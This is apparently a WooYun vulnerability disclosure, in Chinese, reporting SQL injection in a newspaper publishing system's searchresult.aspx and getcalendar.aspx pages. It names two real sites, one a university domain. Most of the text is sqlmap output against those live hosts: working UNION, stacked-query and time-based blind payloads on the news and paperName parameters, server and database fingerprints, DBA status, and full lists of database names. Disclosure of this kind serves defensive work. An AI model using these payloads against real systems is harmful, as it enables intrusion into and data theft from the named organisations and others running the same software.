wybug_title: 某报刊系统存在DBA权限SQL注射合集
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-10-16：	细节已通知厂商并且等待厂商处理中									2014-10-20：	厂商已经确认，细节仅向厂商公开									2014-10-23：	细节向第三方安全合作伙伴开放									2014-12-14：	细节向核心白帽子及相关领域专家公开									2014-12-24：	细节向普通白帽子公开									2015-01-03：	细节向实习白帽子公开									2015-01-14：	细节向公众公开  简要描述： 即得之乌云，则安之~ 详细说明：  从http://wooyun.org/bugs/wooyun-2010-075231 发现了另外几处

主要是news、papaerName、pagenum和qnum这四个参数   漏洞证明：  测试上面中的两个文件如下：1.searchresult.aspx 注入参数：news和paperName2.getcalendar.aspx 注入参数：paperName案例1.http://zsjggw.xnu.edu.cn/searchresult.aspx?bdate=01/01/1967&edate=01/01/1967&news=TczOck1t%&paperName=湘南学院招生简章
Place: GETParameter: news    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: bdate=01/01/1967&edate=01/01/1967&news=TczOck1t%') UNION ALL SELECT CHAR(113)+CHAR(102)+CHAR(105)+CHAR(117)+CHAR(113)+CHAR(107)+CHAR(69)+CHAR(82)+CHAR(74)+CHAR(76)+CHAR(110)+CHAR(101)+CHAR(75)+CHAR(99)+CHAR(78)+CHAR(113)+CHAR(102)+CHAR(113)+CHAR(119)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL-- &paperName=湘南学院招生简章    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: bdate=01/01/1967&edate=01/01/1967&news=TczOck1t%'); WAITFOR DELAY '0:0:5'--&paperName=湘南学院招生简章    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: bdate=01/01/1967&edate=01/01/1967&news=TczOck1t%') WAITFOR DELAY '0:0:5'--&paperName=湘南学院招生简章---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008current user is DBA:    Trueavailable databases [49]:[*] 12530Data[*] CSLG_XSZHCX[*] daxiangnan[*] demoxmy[*] DP12530Data[*] DPCjxlc[*] DPExamData[*] DPPoliceTrainData[*] DPWShopData[*] DTEGS[*] DTISM[*] DTJAVAWShopData[*] DTLibrary[*] DTNETWShopData[*] DTSSData[*] DTWinFormWzglData[*] ExperDB[*] gdscool[*] HMSS[*] jiaowubf[*] JSZHCXDBNEW[*] LMS_XNXY[*] ManageSchool4.0[*] master[*] model[*] msdb[*] net_xnxy_test[*] PoliceTrainTry[*] PracticeDataIOT[*] psy[*] ReportServer[*] ReportServerTempDB[*] ShuoYanHotel[*] siteserver[*] StudyExam[*] sytim[*] tempdb[*] wenjuan[*] wshopData[*] xiaoyou[*] xnubook[*] xnucms[*] xnuerp[*] xnunews[*] XNXYJSZHCXDB[*] XNXYXSZHCXDB[*] XNXYZCDB[*] ZhiVote[*] zhuanti
案例2.http://www.jcfyzz.com:82/searchresult.aspx?bdate=01/01/1967&edate=01/01/1967&news=TczOck1t*&paperName=
Parameter: #1*    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: http://www.jcfyzz.com:82/searchresult.aspx?bdate=01/01/1967&edate=01/01/1967&news=TczOck1t') UNION ALL SELECT CHAR(113)+CHAR(116)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(74)+CHAR(106)+CHAR(84)+CHAR(100)+CHAR(80)+CHAR(68)+CHAR(122)+CHAR(77)+CHAR(66)+CHAR(121)+CHAR(113)+CHAR(100)+CHAR(119)+CHAR(109)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL-- &paperName=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: http://www.jcfyzz.com:82/searchresult.aspx?bdate=01/01/1967&edate=01/01/1967&news=TczOck1t'); WAITFOR DELAY '0:0:5'--&paperName=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: http://www.jcfyzz.com:82/searchresult.aspx?bdate=01/01/1967&edate=01/01/1967&news=TczOck1t') WAITFOR DELAY '0:0:5'--&paperName=---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005current user is DBA:    Falseavailable databases [9]:[*] hsort1[*] jcfydatabase[*] lumigent[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb
